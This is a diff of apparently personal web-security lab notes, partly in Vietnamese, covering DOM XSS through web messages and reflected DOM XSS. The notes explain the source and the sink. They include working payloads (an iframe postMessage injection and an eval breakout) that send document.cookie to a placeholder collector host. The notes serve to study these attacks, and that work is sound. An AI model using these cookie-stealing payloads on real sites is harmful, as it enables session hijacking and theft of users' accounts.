@@ -323,25 +323,39 @@ Hoặc cướp cookie thì như sau
 ![alt text](image-28.png)
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 - [ ] **25/4** — DOM XSS using web messages
+
+#### Source (nguồn dữ liệu không tin cậy)
+
+- `e.data` trong event listener:
+```code
+window.addEventListener('message', function(e) {
+    document.getElementById('ads').innerHTML = e.data;
+});
+```
+- `e.data` đến từ `postMessage()`
+- Vì attacker kiểm soát nội dung gửi qua `postMessage`, nên:
+- Source = `e.data` (dữ liệu từ `postMessage`)
+#### Sink (điểm thực thi nguy hiểm)
+![alt text](image-29.png)
+- `document.getElementById('ads').innerHTML = e.data`
+- using payload below to steal cookie
+```code
+<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://OASTIFY.COM?collector=`+btoa(document.cookie))>','*')">
+```
+
 - [ ] **26/4** — Reflected DOM XSS
+![alt text](image-31.png)
+checking with dom invader we can see 1 sinks is eval ; let go to source code 
+![alt text](image-30.png)
+using payload `\"-alert(1)}//` to exploit 
+
+and using payload below to steal cookie 
+```code
+\"-fetch('https://OASTIFY.COM?reflects='+document.cookie)}//
+```
+
+
 - [ ] **27/4** — DOM-based cookie manipulation
 
 ---
